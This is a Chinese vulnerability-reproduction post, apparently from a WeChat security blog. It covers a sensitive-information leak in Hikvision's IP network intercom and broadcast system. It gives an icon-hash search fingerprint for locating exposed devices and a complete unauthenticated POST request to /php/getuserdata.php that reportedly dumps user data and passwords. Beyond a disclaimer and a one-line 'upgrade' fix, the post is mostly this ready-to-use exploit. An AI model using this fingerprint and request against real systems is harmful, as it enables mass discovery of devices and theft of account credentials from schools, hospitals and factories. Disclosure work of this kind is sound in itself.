#  海康威视IP网络对讲广播系统敏感信息泄露漏洞 附POC  
原创 安服仔
                    安服仔  北风漏洞复现文库   2026-04-02 04:30  
  
# 免责声明：请勿利用文章内的相关技术从事非法测试，由于传播、利用此文所提供的信息或者工具而造成的任何直接或者间接的后果及损失，均由使用者本人负责，所产生的一切不良后果与文章作者无关。该文章仅供学习用途使用。  
  
#   
  
01  
  
—  
  
漏洞名称  
#   
# 海康威视IP网络对讲广播系统敏感信息泄露漏洞  
#   
  
02  
  
—  
  
影响版本  
  
![](https://mmbiz.qpic.cn/mmbiz_png/lhp5P0lJibS2PwCm1LwQ3VYSbrPibpdGKEx5IX1ciatUt5cvp9sqIQeBmTCsvEqicZwTLqgluxmE90v9CfISibcOS7mNvhWibG3hU1aLBx5UZBWNU/640?wx_fmt=png&from=appmsg "")  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/lhp5P0lJibS1KSPtQf8vS05TycqcwNsa6eia85BhicxgedH413pbmuxedibMiciche6BWMNVJm6RV113EgwQZGw8TzpbfZODXHjqq76ibuUWyWFADg/640?wx_fmt=png&from=appmsg&watermark=1&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=0 "")  
  
03  
  
—  
  
漏洞简介  
  
海康威视IP网络对讲广播系统是一套基于IP网络的数字化音频通信系统，融合了对  
讲与广播功能，广泛应用  
于校园、园区、工厂、医院、交通等场景。系统通过局域网或广域网传输音频信号，实现远距离、高保真、低延迟的语音通信。  
海康威视IP网络对讲广播  
系统存在信息泄露漏洞，攻击者可通过特定接口获取系统配置信息、用户数据、账号密码  
等敏感内容。  
  
04  
  
—  
  
资产测绘  
```
icon_hash="-1830859634"
```  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/lhp5P0lJibS2EtcFNibEKoR1GXA6ZJZsmeWbByGLrf8zToTZQgSXszuNYZvPRIVblj4JBJgcBwmicLjfrneJjgEpjBw4Eic2LvUfOFndvNI3Nb8/640?wx_fmt=png&from=appmsg "")  
  
  
  
05  
  
—  
  
漏洞复现  
  
POC  
```
POST /php/getuserdata.php HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:149.0) Gecko/20100101 Firefox/149.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.9,zh-TW;q=0.8,zh-HK;q=0.7,en-US;q=0.6,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: none
Sec-Fetch-User: ?1
Priority: u=0, i
Content-Type: application/x-www-form-urlencoded
Content-Length: 44

jsondata[pageIndex]=0&jsondata[pageCount]=30
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/lhp5P0lJibS0zTqict5Piao30DtyYPcML0nxyVmexI6KDibicYXlkaZwZ3ibiaRPQvnmMSXeQEHBOwY8iahJOfFu9pgwmqg4WPCmh9kcY46bNMjjR3M/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/lhp5P0lJibS1ASdC8z49xYk9hq5bTAiaJ8c5wQXBIz5C0b9oVPR8vvwzqVLGV7qHWAfQdKGGApsxj7fPDxXe3MssOibtUUMic47paawTpGM59s8/640?wx_fmt=png&from=appmsg "")  
  
06  
  
—  
  
修复建议  
  
升级至最新安全版本  
  
  
07  
  
—  
  
往期回顾  
  
  
  
  
  
  
  
